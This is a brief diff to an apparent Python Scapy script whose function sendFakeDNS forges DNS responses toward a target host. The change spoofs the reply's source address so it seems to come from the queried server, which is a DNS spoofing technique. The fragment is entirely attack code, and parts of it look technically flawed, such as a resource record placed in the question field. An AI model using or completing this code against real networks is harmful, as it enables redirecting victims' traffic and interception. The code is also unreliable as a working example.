@@ -20,7 +20,7 @@ def sendFakeDNS(pkt):
     print(pkt[IP].dst)
     print("ok")
     if pkt[IP].src == targetip: 
-        dnsResPacket = IP(dst="10.3.2.34")/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(rrname="61.13.148.37"))
+        dnsResPacket = IP(dst=targetip, src=pkt[IP].dst)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(rrname="61.13.148.37"))
         sendp(dnsResPacket)
     else:
         StopDNS()
